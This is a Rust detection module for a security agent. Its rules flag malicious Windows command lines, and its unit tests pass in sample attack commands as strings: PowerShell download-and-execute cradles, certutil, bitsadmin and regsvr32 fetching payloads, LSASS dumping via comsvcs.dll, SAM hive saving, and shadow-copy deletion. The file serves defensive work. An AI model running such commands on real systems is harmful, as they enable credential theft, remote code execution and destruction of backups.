//! Windows behaviour rules (LOLBins, persistence, defense evasion, credential
//! access) over process starts and image loads.
//!
//! Platform-neutral on purpose: the rules run on every build so recorded or
//! synthetic Windows telemetry replays in CI on Linux (`detection::replay`).
//! They only ever match Windows image names (`*.exe`), so Linux telemetry
//! never reaches them.
//!
//! Precision over recall, because every rule here was written against the
//! benign corpus first: management agents run PowerShell with
//! `-ExecutionPolicy Bypass` all day, admins use `certutil -hashfile` and
//! `vssadmin list shadows`, Office opens links in the browser. Each rule
//! therefore matches the *dangerous form* of a tool, not the tool:
//! `certutil -urlcache … http`, `vssadmin delete shadows`, Office spawning a
//! script host. New rules start in shadow mode (catalog) until the fleet
//! shows they hold.

use super::ioa::ProcContext;
use trapd_schema::{DetectionData, LogEventData};

/// Event IDs are provider-local. Only native records from the documented
/// channel/provider pair can feed Windows event-specific rules; parsed files
/// with matching payload fields are not native audit evidence.
fn matches_eventlog(log: &LogEventData, event_id: u64, channel: &str, provider: &str) -> bool {
    log.source_type == "windows_eventlog"
        && log.log_timestamp.is_some()
        && log.source_path.eq_ignore_ascii_case(channel)
        && log
            .proc
            .as_deref()
            .is_some_and(|p| p.eq_ignore_ascii_case(provider))
        && log.fields.get("EventID").and_then(|v| v.as_u64()) == Some(event_id)
}

/// Native provenance for the event-specific rules supported below. The XML
/// normalizer puts Provider.Name in `proc`; payload fields cannot replace it.
/// A missing recorded time cannot become collection-time audit evidence.
pub(super) fn eventlog_source(log: &LogEventData) -> Option<String> {
    let id = log.fields.get("EventID")?.as_u64()?;
    let (channel, provider) = match id {
        4688 | 4697 | 4698 => ("Security", "Microsoft-Windows-Security-Auditing"),
        7045 => ("System", "Service Control Manager"),
        _ => return None,
    };
    matches_eventlog(log, id, channel, provider).then(|| format!("windows_eventlog:{channel}:{id}"))
}

fn base(path: &str) -> String {
    path.rsplit(['\\', '/'])
        .next()
        .unwrap_or(path)
        .to_ascii_lowercase()
}

/// True for paths an unprivileged user can write to.
pub fn is_user_writable(path: &str) -> bool {
    let l = path.to_ascii_lowercase().replace('/', "\\");
    l.contains("\\appdata\\")
        || l.contains("\\users\\public\\")
        || l.contains("\\windows\\temp\\")
        || l.contains("\\temp\\")
        || l.contains("\\downloads\\")
        || l.contains("\\desktop\\")
        || (l.contains(":\\programdata\\") && !l.contains("\\programdata\\microsoft\\"))
        || l.contains("\\$recycle.bin\\")
}

/// Images in the protected system and program locations. Used by the DLL
/// side-load rule, which only the Windows ETW image-load path feeds.
#[cfg_attr(not(any(windows, test)), allow(dead_code))]
fn is_trusted_location(path: &str) -> bool {
    let l = path.to_ascii_lowercase();
    l.contains(":\\windows\\system32\\")
        || l.contains(":\\windows\\syswow64\\")
        || l.contains(":\\program files\\")
        || l.contains(":\\program files (x86)\\")
}

const OFFICE: &[&str] = &[
    "winword.exe",
    "excel.exe",
    "powerpnt.exe",
    "outlook.exe",
    "msaccess.exe",
    "mspub.exe",
    "visio.exe",
    "onenote.exe",
];
const SCRIPT_HOSTS: &[&str] = &[
    "powershell.exe",
    "pwsh.exe",
    "cmd.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "certutil.exe",
    "bitsadmin.exe",
    "msbuild.exe",
];
const WEB_SERVERS: &[&str] = &[
    "w3wp.exe",
    "httpd.exe",
    "nginx.exe",
    "php-cgi.exe",
    "tomcat9.exe",
    "java.exe",
];
const SHELLS: &[&str] = &[
    "cmd.exe",
    "powershell.exe",
    "pwsh.exe",
    "wscript.exe",
    "cscript.exe",
];

#[allow(clippy::too_many_arguments)]
fn finding(
    rule_id: &str,
    title: &str,
    category: &str,
    tactic: &str,
    technique: &str,
    confidence: u8,
    exe: &str,
    cmdline: &str,
) -> DetectionData {
    DetectionData {
        rule_id: rule_id.into(),
        title: title.into(),
        category: category.into(),
        mitre_tactic: Some(tactic.into()),
        mitre_technique: Some(technique.into()),
        confidence,
        subject: exe.to_string(),
        detail: format!("{title}: {cmdline}"),
        evidence: serde_json::json!({ "cmdline": cmdline }),
        ..Default::default()
    }
}

/// Whether a PowerShell argument list carries an encoded command.
fn encoded_command(lower: &str) -> bool {
    let words: Vec<&str> = lower.split_whitespace().collect();
    words.windows(2).any(|w| {
        let flag = w[0].trim_start_matches(['-', '/']);
        // -e, -en, -enc, … -encodedcommand (PowerShell accepts any prefix);
        // `-ep` / `-executionpolicy` and `-exec` are not it.
        let is_enc = flag == "ec" || (!flag.is_empty() && "encodedcommand".starts_with(flag));
        is_enc
            && w[1].len() >= 20
            && w[1]
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
    })
}

/// Inspect one Windows process start. Returns every rule that matched.
pub fn inspect_process(
    name: &str,
    exe: &str,
    cmdline: &str,
    ctx: Option<&ProcContext>,
) -> Vec<DetectionData> {
    let image = {
        let b = base(exe);
        if b.is_empty() {
            base(name)
        } else {
            b
        }
    };
    if !image.ends_with(".exe") {
        return Vec::new();
    }
    let lower = cmdline.to_ascii_lowercase();
    let mut out = Vec::new();
    let has = |needles: &[&str]| needles.iter().any(|n| lower.contains(n));
    let http = lower.contains("http://") || lower.contains("https://") || lower.contains("ftp://");

    match image.as_str() {
        "powershell.exe" | "pwsh.exe" | "powershell_ise.exe" => {
            if encoded_command(&lower) {
                out.push(finding(
                    "execution.powershell_encoded",
                    "PowerShell with encoded command",
                    "execution",
                    "TA0002 Execution",
                    "T1059.001",
                    70,
                    exe,
                    cmdline,
                ));
            }
            let download = has(&[
                "downloadstring",
                "downloadfile",
                "downloaddata",
                "net.webclient",
                "invoke-webrequest",
                "iwr ",
                "start-bitstransfer",
                "invoke-restmethod",
                "irm ",
            ]);
            let exec = has(&[
                "iex",
                "invoke-expression",
                "| iex",
                "-windowstyle hidden",
                "-w hidden",
                "-win hidden",
                "frombase64string",
            ]);
            if download && exec {
                out.push(finding(
                    "execution.powershell_download_exec",
                    "PowerShell downloads and executes code",
                    "lolbin",
                    "TA0002 Execution",
                    "T1105",
                    85,
                    exe,
                    cmdline,
                ));
            }
            if has(&["set-mppreference"])
                && has(&["-disable", "$true"])
                && has(&[
                    "disablerealtimemonitoring",
                    "disableioavprotection",
                    "disablebehaviormonitoring",
                    "disablescriptscanning",
                    "disableblockatfirstseen",
                ])
                || has(&["add-mppreference"])
                    && has(&["-exclusionpath", "-exclusionprocess", "-exclusionextension"])
            {
                out.push(finding(
                    "defense_evasion.defender_tamper",
                    "Microsoft Defender protection disabled or excluded",
                    "defense_evasion",
                    "TA0005 Defense Evasion",
                    "T1562.001",
                    80,
                    exe,
                    cmdline,
                ));
            }
            if has(&["clear-eventlog", "remove-eventlog"])
                || has(&["wevtutil"]) && has(&[" cl ", "clear-log"])
            {
                out.push(finding(
                    "defense_evasion.eventlog_clear",
                    "Windows event log cleared",
                    "defense_evasion",
                    "TA0005 Defense Evasion",
                    "T1070.001",
                    85,
                    exe,
                    cmdline,
                ));
            }
        }
        "certutil.exe" => {
            if (has(&["-urlcache", "/urlcache", "-verifyctl", "/verifyctl"]) && http)
                || has(&["-decode", "/decode", "-decodehex", "/decodehex"])
            {
                out.push(finding(
                    "lolbin.certutil_download",
                    "certutil used to download or decode a payload",
                    "lolbin",
                    "TA0011 Command and Control",
                    "T1105",
                    80,
                    exe,
                    cmdline,
                ));
            }
        }
        "mshta.exe" => {
            if http || has(&["javascript:", "vbscript:", "about:"]) {
                out.push(finding(
                    "lolbin.mshta_remote",
                    "mshta executes remote or inline script",
                    "lolbin",
                    "TA0005 Defense Evasion",
                    "T1218.005",
                    85,
                    exe,
                    cmdline,
                ));
            }
        }
        "rundll32.exe" => {
            let args = lower
                .split_once("rundll32.exe")
                .map(|(_, a)| a.trim().trim_start_matches('"').trim())
                .unwrap_or(lower.trim());
            if has(&["javascript:", "mshtml,runhtmlapplication", "vbscript:"]) {
                out.push(finding(
                    "lolbin.rundll32_script",
                    "rundll32 executes script",
                    "lolbin",
                    "TA0005 Defense Evasion",
                    "T1218.011",
                    85,
                    exe,
                    cmdline,
                ));
            } else if args.is_empty() || args == "rundll32" {
                // Process injection targets are often started without arguments.
                out.push(finding(
                    "lolbin.rundll32_no_args",
                    "rundll32 started without a DLL",
                    "lolbin",
                    "TA0005 Defense Evasion",
                    "T1218.011",
                    60,
                    exe,
                    cmdline,
                ));
            }
            if has(&["comsvcs.dll"]) && has(&["minidump", "#24"]) {
                out.push(finding(
                    "credential_access.lsass_dump",
                    "LSASS memory dumped via comsvcs.dll",
                    "credential_access",
                    "TA0006 Credential Access",
                    "T1003.001",
                    95,
                    exe,
                    cmdline,
                ));
            }
        }
        "regsvr32.exe" => {
            if (has(&["/i:", "-i:"]) && http) || has(&["scrobj.dll"]) {
                out.push(finding(
                    "lolbin.regsvr32_remote",
                    "regsvr32 loads a remote scriptlet",
                    "lolbin",
                    "TA0005 Defense Evasion",
                    "T1218.010",
                    90,
                    exe,
                    cmdline,
                ));
            }
        }
        "bitsadmin.exe" => {
            if has(&["/transfer", "/addfile", "/download"]) && http {
                out.push(finding(
                    "lolbin.bitsadmin_download",
                    "bitsadmin downloads a file",
                    "lolbin",
                    "TA0011 Command and Control",
                    "T1197",
                    70,
                    exe,
                    cmdline,
                ));
            }
        }
        "wmic.exe" => {
            if has(&["process call create"]) {
                out.push(finding(
                    "execution.wmic_process_create",
                    "WMIC starts a process",
                    "execution",
                    "TA0002 Execution",
                    "T1047",
                    65,
                    exe,
                    cmdline,
                ));
            }
            if has(&["shadowcopy delete"]) {
                out.push(finding(
                    "impact.shadow_copy_delete",
                    "Volume shadow copies deleted",
                    "impact",
                    "TA0040 Impact",
                    "T1490",
                    90,
                    exe,
                    cmdline,
                ));
            }
        }
        "vssadmin.exe" => {
            if has(&["delete shadows", "resize shadowstorage"]) {
                out.push(finding(
                    "impact.shadow_copy_delete",
                    "Volume shadow copies deleted",
                    "impact",
                    "TA0040 Impact",
                    "T1490",
                    90,
                    exe,
                    cmdline,
                ));
            }
        }
        "wbadmin.exe" => {
            if has(&[
                "delete catalog",
                "delete systemstatebackup",
                "delete backup",
            ]) {
                out.push(finding(
                    "impact.shadow_copy_delete",
                    "Backup catalog deleted",
                    "impact",
                    "TA0040 Impact",
                    "T1490",
                    90,
                    exe,
                    cmdline,
                ));
            }
        }
        "bcdedit.exe" => {
            if has(&["recoveryenabled no", "bootstatuspolicy ignoreallfailures"]) {
                out.push(finding(
                    "impact.recovery_disabled",
                    "Windows recovery disabled",
                    "impact",
                    "TA0040 Impact",
                    "T1490",
                    85,
                    exe,
                    cmdline,
                ));
            }
        }
        "wevtutil.exe" => {
            if lower
                .split_whitespace()
                .any(|w| w == "cl" || w == "clear-log")
            {
                out.push(finding(
                    "defense_evasion.eventlog_clear",
                    "Windows event log cleared",
                    "defense_evasion",
                    "TA0005 Defense Evasion",
                    "T1070.001",
                    85,
                    exe,
                    cmdline,
                ));
            }
        }
        "schtasks.exe" => {
            if has(&["/create", "-create"]) {
                let target = lower.split_once("/tr").map(|(_, t)| t).unwrap_or("");
                if is_user_writable(target)
                    || target.contains("powershell") && has(&["-enc", "http"])
                {
                    out.push(finding(
                        "persistence.schtasks_user_path",
                        "Scheduled task runs from a user-writable path",
                        "persistence",
                        "TA0003 Persistence",
                        "T1053.005",
                        70,
                        exe,
                        cmdline,
                    ));
                }
            }
        }
        "sc.exe" => {
            if has(&[" create "])
                && is_user_writable(lower.split_once("binpath").map(|(_, t)| t).unwrap_or(""))
            {
                out.push(finding(
                    "persistence.service_user_path",
                    "Service created from a user-writable path",
                    "persistence",
                    "TA0003 Persistence",
                    "T1543.003",
                    75,
                    exe,
                    cmdline,
                ));
            }
            if has(&[
                "stop windefend",
                "config windefend start= disabled",
                "delete windefend",
            ]) {
                out.push(finding(
                    "defense_evasion.defender_tamper",
                    "Microsoft Defender service stopped",
                    "defense_evasion",
                    "TA0005 Defense Evasion",
                    "T1562.001",
                    85,
                    exe,
                    cmdline,
                ));
            }
        }
        "reg.exe" => {
            if has(&[" add "])
                && has(&[
                    "\\currentversion\\run",
                    "\\currentversion\\runonce",
                    "\\winlogon\" /v userinit",
                    "\\winlogon /v shell",
                ])
            {
                out.push(finding(
                    "persistence.run_key",
                    "Autostart registry value added",
                    "persistence",
                    "TA0003 Persistence",
                    "T1547.001",
                    65,
                    exe,
                    cmdline,
                ));
            }
            if has(&[" save ", " export "])
                && has(&[
                    "hklm\\sam",
                    "hklm\\security",
                    "hkey_local_machine\\sam",
                    "hkey_local_machine\\security",
                ])
            {
                out.push(finding(
                    "credential_access.sam_hive_save",
                    "SAM/SECURITY hive saved",
                    "credential_access",
                    "TA0006 Credential Access",
                    "T1003.002",
                    90,
                    exe,
                    cmdline,
                ));
            }
        }
        "procdump.exe" | "procdump64.exe" => {
            if has(&["lsass"]) {
                out.push(finding(
                    "credential_access.lsass_dump",
                    "LSASS memory dumped",
                    "credential_access",
                    "TA0006 Credential Access",
                    "T1003.001",
                    95,
                    exe,
                    cmdline,
                ));
            }
        }
        "nltest.exe" if has(&["/domain_trusts", "/dclist", "/all_trusts"]) => {
            out.push(finding(
                "discovery.ad_trusts",
                "Active Directory trust discovery",
                "discovery",
                "TA0007 Discovery",
                "T1482",
                45,
                exe,
                cmdline,
            ));
        }
        _ => {}
    }

    // Lineage rules.
    if let Some(ctx) = ctx {
        let parents: Vec<String> = ctx
            .ancestor_comms
            .iter()
            .take(3)
            .map(|a| a.to_ascii_lowercase())
            .collect();
        if SCRIPT_HOSTS.contains(&image.as_str()) {
            if let Some(office) = parents.first().filter(|p| OFFICE.contains(&p.as_str())) {
                let mut f = finding(
                    "execution.office_child_shell",
                    "Office application started a script host",
                    "execution",
                    "TA0002 Execution",
                    "T1204.002",
                    80,
                    exe,
                    cmdline,
                );
                f.evidence["parent"] = serde_json::json!(office);
                out.push(f);
            }
        }
        if SHELLS.contains(&image.as_str()) {
            if let Some(web) = parents.iter().find(|p| WEB_SERVERS.contains(&p.as_str())) {
                let mut f = finding(
                    "webshell.windows_child_shell",
                    "Web server process started a shell",
                    "webshell",
                    "TA0003 Persistence",
                    "T1505.003",
                    85,
                    exe,
                    cmdline,
                );
                f.evidence["parent"] = serde_json::json!(web);
                out.push(f);
            }
        }
    }
    out
}

/// A DLL loaded from a user-writable location into a process that runs from
/// a protected one: the DLL search-order hijack / side-loading pattern.
/// Per-user installations (OneDrive, Teams) load from AppData too, but their
/// *process* lives there as well, so they do not match.
#[cfg_attr(not(any(windows, test)), allow(dead_code))]
pub fn inspect_image_load(process_exe: &str, dll: &str) -> Option<DetectionData> {
    let dll_l = dll.to_ascii_lowercase();
    if !dll_l.ends_with(".dll") || !is_trusted_location(process_exe) || !is_user_writable(dll) {
        return None;
    }
    // Shell extensions of per-user sync clients load into explorer.exe.
    const KNOWN_PER_USER: &[&str] = &[
        "\\appdata\\local\\microsoft\\onedrive\\",
        "\\appdata\\local\\microsoft\\teams\\",
        "\\appdata\\local\\microsoft\\windowsapps\\",
        "\\appdata\\local\\packages\\",
    ];
    if KNOWN_PER_USER.iter().any(|k| dll_l.contains(k)) {
        return None;
    }
    Some(DetectionData {
        rule_id: "defense_evasion.dll_sideload".into(),
        title: "Protected program loaded a DLL from a user-writable folder".into(),
        category: "defense_evasion".into(),
        mitre_tactic: Some("TA0005 Defense Evasion".into()),
        mitre_technique: Some("T1574.002".into()),
        confidence: 60,
        subject: process_exe.to_string(),
        detail: format!("{process_exe} loaded {dll}"),
        evidence: serde_json::json!({ "process": process_exe, "dll": dll }),
        ..Default::default()
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ids(name: &str, cmd: &str) -> Vec<String> {
        let exe = format!("C:\\Windows\\System32\\{name}");
        inspect_process(name, &exe, cmd, None)
            .into_iter()
            .map(|d| d.rule_id)
            .collect()
    }

    #[test]
    fn attack_forms_are_detected() {
        let cases = [
            ("powershell.exe", "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "execution.powershell_encoded"),
            ("powershell.exe", "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\"", "execution.powershell_download_exec"),
            ("powershell.exe", "powershell Set-MpPreference -DisableRealtimeMonitoring $true", "defense_evasion.defender_tamper"),
            ("powershell.exe", "powershell Add-MpPreference -ExclusionPath C:\\Users\\Public", "defense_evasion.defender_tamper"),
            ("certutil.exe", "certutil -urlcache -split -f http://x/a.exe C:\\Users\\Public\\a.exe", "lolbin.certutil_download"),
            ("certutil.exe", "certutil -decode a.b64 a.exe", "lolbin.certutil_download"),
            ("mshta.exe", "mshta http://x/a.hta", "lolbin.mshta_remote"),
            ("rundll32.exe", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";alert(1)", "lolbin.rundll32_script"),
            ("rundll32.exe", "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full", "credential_access.lsass_dump"),
            ("regsvr32.exe", "regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll", "lolbin.regsvr32_remote"),
            ("bitsadmin.exe", "bitsadmin /transfer j /download /priority high http://x/a.exe C:\\t\\a.exe", "lolbin.bitsadmin_download"),
            ("wmic.exe", "wmic process call create \"cmd /c whoami\"", "execution.wmic_process_create"),
            ("vssadmin.exe", "vssadmin delete shadows /all /quiet", "impact.shadow_copy_delete"),
            ("wmic.exe", "wmic shadowcopy delete", "impact.shadow_copy_delete"),
            ("wbadmin.exe", "wbadmin delete catalog -quiet", "impact.shadow_copy_delete"),
            ("bcdedit.exe", "bcdedit /set {default} recoveryenabled No", "impact.recovery_disabled"),
            ("wevtutil.exe", "wevtutil cl Security", "defense_evasion.eventlog_clear"),
            ("schtasks.exe", "schtasks /create /sc onlogon /tn upd /tr C:\\Users\\a\\AppData\\Roaming\\u.exe", "persistence.schtasks_user_path"),
            ("sc.exe", "sc create svc binpath= C:\\Users\\Public\\s.exe start= auto", "persistence.service_user_path"),
            ("reg.exe", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v u /d C:\\u.exe", "persistence.run_key"),
            ("reg.exe", "reg save HKLM\\SAM C:\\t\\sam.save", "credential_access.sam_hive_save"),
        ];
        for (name, cmd, rule) in cases {
            assert!(
                ids(name, cmd).contains(&rule.to_string()),
                "{rule} missed for: {cmd}"
            );
        }
    }

    #[test]
    fn benign_admin_forms_are_not_detected() {
        for (name, cmd) in [
            ("powershell.exe", "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \\\\fs01\\it$\\scripts\\Get-Inventory.ps1"),
            ("powershell.exe", "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -executionPolicy bypass -file \"C:\\Program Files (x86)\\Microsoft Intune Management Extension\\Policies\\Scripts\\a_1.ps1\""),
            ("powershell.exe", "powershell -ep bypass -command Get-Service"),
            ("powershell.exe", "powershell Invoke-WebRequest https://x/a.zip -OutFile a.zip"),
            ("certutil.exe", "certutil -hashfile C:\\Install\\setup.msi SHA256"),
            ("rundll32.exe", "C:\\Windows\\system32\\rundll32.exe C:\\Windows\\system32\\PcaSvc.dll,PcaPatchSdbTask"),
            ("vssadmin.exe", "vssadmin list shadows"),
            ("bcdedit.exe", "bcdedit /enum {current}"),
            ("schtasks.exe", "schtasks /query /fo LIST /v"),
            ("schtasks.exe", "schtasks /create /tn Backup /tr \"C:\\Program Files\\Veeam\\backup.exe\" /sc daily"),
            ("sc.exe", "sc query wuauserv"),
            ("reg.exe", "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
            ("wevtutil.exe", "wevtutil qe Security /c:10"),
            ("mshta.exe", "mshta.exe C:\\Program Files\\App\\setup.hta"),
        ] {
            assert!(ids(name, cmd).is_empty(), "false positive {:?} for {cmd}", ids(name, cmd));
        }
    }

    #[test]
    fn low_confidence_admin_signals() {
        assert_eq!(
            ids("rundll32.exe", "rundll32.exe"),
            vec!["lolbin.rundll32_no_args".to_string()]
        );
        assert_eq!(
            ids("nltest.exe", "nltest /domain_trusts"),
            vec!["discovery.ad_trusts".to_string()]
        );
    }

    #[test]
    fn linux_processes_never_match() {
        assert!(
            inspect_process("bash", "/usr/bin/bash", "vssadmin delete shadows", None).is_empty()
        );
    }

    #[test]
    fn office_and_web_lineage() {
        let ctx = |parent: &str| ProcContext {
            ancestor_comms: vec![parent.to_string(), "explorer.exe".to_string()],
            ..Default::default()
        };
        let r = inspect_process(
            "powershell.exe",
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell -c whoami",
            Some(&ctx("WINWORD.EXE")),
        );
        assert!(r
            .iter()
            .any(|d| d.rule_id == "execution.office_child_shell"));
        let r = inspect_process(
            "cmd.exe",
            "C:\\Windows\\System32\\cmd.exe",
            "cmd /c whoami",
            Some(&ctx("w3wp.exe")),
        );
        assert!(r
            .iter()
            .any(|d| d.rule_id == "webshell.windows_child_shell"));
        // Office opening the browser is normal.
        let r = inspect_process(
            "msedge.exe",
            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
            "msedge https://x",
            Some(&ctx("OUTLOOK.EXE")),
        );
        assert!(r.is_empty());
    }

    #[test]
    fn sideloading_requires_protected_process_and_writable_dll() {
        assert_eq!(
            inspect_image_load(
                "C:\\Windows\\System32\\svchost.exe",
                "C:\\Users\\a\\AppData\\Local\\Temp\\version.dll"
            )
            .map(|d| d.rule_id),
            Some("defense_evasion.dll_sideload".to_string())
        );
        assert!(inspect_image_load(
            "C:\\Program Files\\App\\app.exe",
            "C:\\ProgramData\\evil\\x.dll"
        )
        .is_some());
        // Per-user apps load their own DLLs.
        assert!(inspect_image_load(
            "C:\\Users\\a\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
            "C:\\Users\\a\\AppData\\Local\\Microsoft\\Teams\\current\\ffmpeg.dll"
        )
        .is_none());
        // OneDrive shell extension in explorer.
        assert!(inspect_image_load(
            "C:\\Windows\\explorer.exe",
            "C:\\Users\\a\\AppData\\Local\\Microsoft\\OneDrive\\24.1\\FileSyncShell64.dll"
        )
        .is_none());
        assert!(inspect_image_load(
            "C:\\Windows\\System32\\svchost.exe",
            "C:\\Windows\\System32\\ntdll.dll"
        )
        .is_none());
        assert!(inspect_image_load(
            "C:\\Windows\\System32\\svchost.exe",
            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\x\\MpOav.dll"
        )
        .is_none());
    }

    #[test]
    fn encoded_command_flag_prefixes() {
        let b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA";
        for f in [
            "-e",
            "-ec",
            "-enc",
            "-encodedcommand",
            "/enc",
            "-EncodedCommand",
        ] {
            assert!(
                encoded_command(&format!("powershell {f} {b64}").to_ascii_lowercase()),
                "{f}"
            );
        }
        for f in ["-ep", "-executionpolicy", "-exec"] {
            assert!(
                !encoded_command(&format!("powershell {f} {b64}").to_ascii_lowercase()),
                "{f}"
            );
        }
    }
}
